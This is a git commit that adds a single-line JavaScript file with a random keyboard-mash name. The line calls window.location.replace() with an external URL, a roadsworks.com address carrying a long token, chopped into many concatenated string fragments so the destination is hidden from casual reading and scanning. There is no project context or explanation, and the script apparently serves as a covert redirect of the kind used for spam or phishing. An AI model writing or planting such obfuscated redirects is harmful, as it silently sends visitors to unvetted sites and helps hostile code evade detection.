b99aebbcd49af09556a057dae8e9c74ef0c9854a
Parabeauty <113865732+Parabeauty@users.noreply.github.com>
2022-12-18 14:35:34 +0100

    Create dyhfyhjdrthdryjsdfghftyhjsrtgsrd.js

---
+++ dyhfyhjdrthdryjsdfghftyhjsrtgsrd.js
@@ -0,0 +1,1 @@
+window.location.replace(``.concat(`ht`,`tps:/`,`/ww`,`w.roa`,`dswor`,`ks.co`,`m/V0p0`,`ljJEcX`,`BBoh1Zf`,`2-7c4hzI`,`nl-9a8Q`,`HXatZ`,`swVrDI`,`Gf0LEQ`,`-ak5sS`,`qeuZ7d6yR`,`w3B6Po`,`T-aQ6`,`Cio82t`,`Cg-MA~~/TA`,`HA/9d2cj6gkj6`))
